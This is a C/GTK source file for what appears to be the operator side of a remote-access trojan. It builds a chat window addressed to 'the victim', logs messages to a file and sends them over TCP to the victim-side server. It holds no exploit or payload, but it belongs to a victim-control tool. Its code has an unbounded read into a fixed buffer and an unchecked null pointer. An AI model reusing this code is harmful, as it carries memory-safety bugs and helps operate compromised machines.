#include <stdio.h>
#include <stdlib.h>
#include <string.h>  //strlen()

#include <sys/types.h>  // send()
#include <sys/socket.h>  // send()
#include <netinet/in.h>  // SOCKADDR_IN
#include <arpa/inet.h>  // inet_addr()
#include <netdb.h>  //gethostbyaddr()

#include <gtk-2.0/gtk/gtk.h>

#include "../includes/constants.h"
#include "../includes/utils.h"

#include "../includes/callbacks_tchat.h"

GtkWidget *main_win;
GtkWidget *tchat_text_view = NULL;

const gchar *server_ip;
const gchar *server_port;
int port;

void cb_start_tchat(GtkButton *button, gpointer user_data)
{
    //GtkWidget *hosts_text_view = NULL;
    GtkWidget *tchat_window = NULL;
    GtkWidget *hBox = NULL;
    GtkWidget *scrollbar;

    GtkWidget *menu_bar = NULL;
    GtkWidget *menu = NULL;
    GtkWidget *menu_item = NULL;
    GtkWidget *vBox = NULL;
    
    GtkWidget *tchat_frame = NULL;
    GtkWidget *tchat_zone = NULL;
    //GtkWidget *tchat_text_view = NULL;
    GtkWidget *typing_entry = NULL;
    GtkWidget *send_text = NULL;
  
    tchat_zone = gtk_fixed_new();
    tchat_frame = gtk_frame_new(NULL);
    
    tchat_window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
    gtk_window_set_default_size(GTK_WINDOW(tchat_window), 800, 400);
    //g_signal_connect(G_OBJECT(editorWindow), "destroy", G_CALLBACK(gtk_main_quit), NULL);
    gtk_window_set_title(GTK_WINDOW(tchat_window), "Tchat with the victim");
    
    gtk_container_add(GTK_CONTAINER(tchat_window), tchat_zone);
    
    gtk_frame_set_label(GTK_FRAME(tchat_frame), " - Nasty Attacker - ");
    gtk_frame_set_label_align(GTK_FRAME(tchat_frame), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(tchat_frame), GTK_SHADOW_ETCHED_OUT);
    gtk_widget_set_usize(tchat_frame, 760, 295);
    
    gtk_fixed_put(GTK_FIXED(tchat_zone), tchat_frame, 20, 20);
    
    scrollbar = gtk_scrolled_window_new(NULL, NULL);
    gtk_widget_set_size_request(scrollbar, 720, 250);
    
    gtk_fixed_put(GTK_FIXED(tchat_zone), scrollbar, 40, 45);

    tchat_text_view = gtk_text_view_new();
    gtk_container_add(GTK_CONTAINER(scrollbar), tchat_text_view);
    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(scrollbar), GTK_POLICY_AUTOMATIC, GTK_POLICY_AUTOMATIC);
    //gtk_widget_set_size_request(tchat_text_view, 320, 400);
    
    gtk_text_view_set_editable((GtkTextView*)tchat_text_view, FALSE);
    gtk_text_view_set_cursor_visible((GtkTextView*)tchat_text_view, TRUE);
    
    typing_entry = gtk_entry_new_with_max_length(256);
    gtk_entry_set_text(GTK_ENTRY(typing_entry), "Type your text here ...");
    gtk_widget_set_size_request(typing_entry, 720, 50);
    gtk_fixed_put(GTK_FIXED(tchat_zone), typing_entry, 20, 320);
    
    send_text = gtk_button_new_with_label("◄");
    gtk_widget_set_size_request(send_text, 50, 50);
    gtk_fixed_put(GTK_FIXED(tchat_zone), send_text, 740, 320);
    g_signal_connect(G_OBJECT(send_text), "clicked", G_CALLBACK(cb_send_text_and_connect), typing_entry);

    gtk_widget_show_all(tchat_window);
    
}

void cb_send_text_and_connect(GtkButton *button, gpointer user_data)
{
    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;
    
    const char *buffer = NULL;
    char *final_text = NULL;
    gchar *text_utf8 = NULL;
    size_t len_msg = 0;
    
    FILE *backup = NULL;
    char read_text[1024] = "";
    
    int caractereLu = 0;
    int i = 0;
    
    size_t flag_tchat = 18;
    
    SOCKET sock = 0;
    SOCKADDR_IN sin;

    struct hostent *he = NULL;
    struct in_addr ipv4addr;
    int err = 0;
    
    backup = fopen("backup.log", "a");
    if(backup == NULL)
    {
        error("fopen() backup", "cb_send_text_and_connect()");
        return;        
    }

    /* Get The text typed in Tchat and add to it the nickname "Nasty Attacker" */
    buffer = gtk_entry_get_text(GTK_ENTRY(user_data));
    
    final_text = malloc(1024 * sizeof(char));
    if(final_text == NULL)
    {
        error("malloc final_text", "cb_send_text_and_connect()");
        return;
    }

    final_text = strncpy(final_text, "Nasty Attacker : ", 18);
    final_text = strncat(final_text, buffer, strlen(buffer) + 1);

    text_utf8 = g_locale_to_utf8(final_text, -1, NULL, NULL, NULL);
    
    /* Write the sentences in backup.log file */
    fputs(text_utf8, backup);
    fputs("\n", backup);
    
    fclose(backup);
    
    gtk_entry_set_text (GTK_ENTRY(user_data), "");
    
    /* Read the historic of tchat from the file backup.log and print it on the tchat 
     * windows wih the last sentence typed */
    
    backup = fopen("backup.log", "r");
    if(backup == NULL)
    {
        error("fopen() backup.log", "cb_send_text_and_connect()");
        return;
    }
    
    while((caractereLu = fgetc(backup)) != EOF)
    {
        read_text[i] = (char)caractereLu;
        i++;
    }
    
    text_utf8 = g_locale_to_utf8(read_text, strlen(read_text), NULL, NULL, NULL);


    text_buffer = gtk_text_view_get_buffer((GtkTextView*)(tchat_text_view));

    gtk_text_buffer_set_text(text_buffer, text_utf8, -1);

    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    g_print("%s\n", text);

    g_free(text);

    fclose(backup);
    
    
    /* Connect to server and send the last sentence typed */
    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET)
    {
        error("socket()", "cb_send_text_and_connect()");
        return;
    }

    err = connect(sock, (SOCKADDR*)&sin, sizeof(sin));
    if(err == SOCKET_ERROR)
    {
        error("connect()", "cb_send_text_and_connect()");
        return;
    }

    if(send(sock, (char*)&flag_tchat, sizeof(flag_tchat), 0) == SOCKET_ERROR)
    {
        error("send() flag_tchat", "cb_send_text_and_connect()");
        return;
    }
    
    len_msg = strlen(final_text) + 1;
    
    if(send(sock, (char*)&len_msg, sizeof(len_msg), 0) == SOCKET_ERROR)
    {
        error("send() len_msg", "cb_send_text_and_connect()");
        return;
    }
    
    if(send(sock, final_text, len_msg, 0) == SOCKET_ERROR)
    {
        error("send() final_text", "cb_send_text_and_connect()");
        return;
    }
    
    free(final_text);
    
    /* unused parameter */
    (void)button;
    
    return;
}